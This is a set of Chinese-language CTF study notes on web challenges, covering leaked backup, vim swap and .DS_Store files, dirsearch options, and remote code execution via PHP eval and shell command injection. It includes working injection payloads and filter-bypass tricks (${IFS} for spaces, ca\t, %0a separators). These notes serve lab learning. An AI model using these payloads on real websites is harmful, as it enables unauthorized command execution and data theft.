## web技能树笔记

### 一、信息泄露

#### 1.目录遍历

dirsearch的使用

```
-u               攻击目标url地址，可以指定多个，通过逗号分隔
-l                url列表文件，比如你可以建一个 targets.txt，里面包含需要攻击的网址
-e               站点文件类型列表，如：php,asp，有默认配置：php,aspx,jsp,html,js，基本主流的格式都包含了
-X               不需要扫描的站点文件类型列表
-w               用指定爆破字典执行，若存在多个通过逗号分隔
-t               指定线程数
-i               仅现实指定的状态码，指定多个通过逗号分隔 
-x               不显示指定的状态码，指定多个通过逗号分隔 
--exclude-sizes=SIZES               不显示的响应包大小（Example: 123B,4KB）
--exclude-texts=TEXTS               不显示的响应包关键字 (Example: "Not found", "Error"）
-m               指定请求方式，默认GET
-h               帮助信息
```

#### 2.phpinfo（）函数使用

phpinfo() 是php中查看相关信息的函数，当在页面中执行phpinfo()函数时，php会将自身的所有信息全部打印出来。在phpinfo中会泄露很多服务端的一些信息，例如安装的一些模块、网站绝对路径、服务器自身的操作系统、使用的组件版本等等

在 PHP Variables 分类下的 $_ENV["FLAG"] 找到flag

#### 3.备份文件

##### （1）网站源码泄露

常见文件名

```
.rar
.zip
.7z
.tar
.tar.gz
.bak
.txt
.phps （用于浏览器查看php文件内容）
.swp(vim产生的临时文件，第二次是.swo，注：其文件前有个点，如文件名为index产生的临时文件为.index.swp)
~ (在文本编辑时产生的备份文件)
```

常见文件后缀

```
web
website
backup
back
www
wwwroot
temp
index
```

可在网站中直接访问备份文件获取flag，而不是在本地打开

##### （2）bak文件泄露

有些时候网站管理员可能为了方便，会在修改某个文件的时候先复制一份，将其命名为xxx.bak。而大部分Web Server对bak文件并不做任何处理，导致可以直接下载，从而获取到网站某个文件的源代码

curl工具的使用：[curl工具的入门级使用-CSDN博客](https://blog.csdn.net/m0_74259636/article/details/135953963)
使用curl通过网站访问bak文件，解决文件泄露的问题

##### （3）-vim 交换文件名

在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容以 index.php 为例：第一次产生的交换文件名为 `.index.php.swp`再次意外退出后，将会产生名为 `.index.php.swo` 的交换文件第三次产生的交换文件则为 `.index.php.swn`

注：访问隐含文件需要加.

用curl访问即可得到flag

```
curl https://a.com -o -      curl直接把文件输出在终端的命令，可直接查看二进制文件注释里隐含的flag
```

##### （4） .DS_Store 文件利用

`.DS_Store` 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过`.DS_Store`可以知道这个目录里面所有文件的清单。

用curl访问这个文件，然后发现里面的txt文件，再访问其中的txt文件

### 二、RCE

##### 1.eval执行

**eval()**函数是可以把一串字符串作为PHP代码执行，**system()**函数的作用为执行系统命令并输出执行结果

```
/?cmd=system("ls");  //先查看根目录文件
/?cmd=system("ls /");  //再查看上一级文件夹
/?cmd=system("cat flag_28080");  //cat查看文件
```

![image-20240924204400546](C:\Users\17955\AppData\Roaming\Typora\typora-user-images\image-20240924204400546.png)

##### 2.命令注入-无过滤

```php
linux中命令的链接符号
1.每个命令之间用;隔开
说明：各命令的执行给果，不会影响其它命令的执行。换句话说，各个命令都会执行，但不保证每个命令都执行成功。
2.每个命令之间用&&隔开
说明：若前面的命令执行成功，才会去执行后面的命令。这样可以保证所有的命令执行完毕后，执行过程都是成功的。
3.每个命令之间用||隔开
说明：||是或的意思，只有前面的命令执行失败后才去执行下一条命令，直到执行成功一条命令为止。
4. | 是管道符号。管道符号改变标准输入的源或者是标准输出的目的地。
5. & 是后台任务符号。 后台任务符号使shell在后台执行该任务，这样用户就可以立即得到一个提示符并继续其他工作。
```

无回显则查看页面源代码

![image-20240924221245961](C:\Users\17955\AppData\Roaming\Typora\typora-user-images\image-20240924221245961.png)

或转为base64后解码

![image-20240924221412351](C:\Users\17955\AppData\Roaming\Typora\typora-user-images\image-20240924221412351.png)

```
|直接执行后面的语句：
||如果前面的语句执行出错，则执行后面的语句，否则仅执行前面的语句：
&前后的语句均可执行，但是前面的语句如果执行结果为假（即执行失败），则仅输出后面语句的结果：
&&如果前面的语句为假，则直接报错，也不执行后面的语句。
;按顺序执行语句（Linux）
```

##### 3.过滤综合

###### （1）过滤cat

```
linux查看文本的命令
cat 由第一行开始显示内容，并将所有内容输出
tac 从最后一行倒序显示内容，并将所有内容输出
more 根据窗口大小，一页一页的现实文件内容
less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符
head 只显示头几行
tail 只显示最后几行
nl 类似于cat -n，显示时输出行号
tailf 类似于tail -f
```

使用more命令代替cat

###### （2）过滤空格

在 bash 下, 可以用以下字符代替空格：

```
<,<>,%20(space),%09(tab),$IFS$9, ${IFS},$IFS  等
```

![image-20240924222932526](C:\Users\17955\AppData\Roaming\Typora\typora-user-images\image-20240924222932526.png)

######   (3)过滤目录分隔符

```
12.0.0.1;cd flag_is_here;ls
12.0.0.1;cd flag_is_here;cat flag_173323177320747.php|base64
```

###### （4）综合过滤练习

```
空格可以用${IFS}，$IFS$9
cat可以用more，或者用ca\t即可，\可进行大部分简单绕过，c\at
flag可以用正则f***
ls可用dir 命令最基本的用途是列出当前目录的内容
ctfhub应该用不到
在linux下，命令分隔符除了;还有%0a
有了；就可以不用运算符了
```

因为%0a是url编码，所以一定要输在url中，否则%0a会被再次编码

![image-20240924224602203](C:\Users\17955\AppData\Roaming\Typora\typora-user-images\image-20240924224602203.png)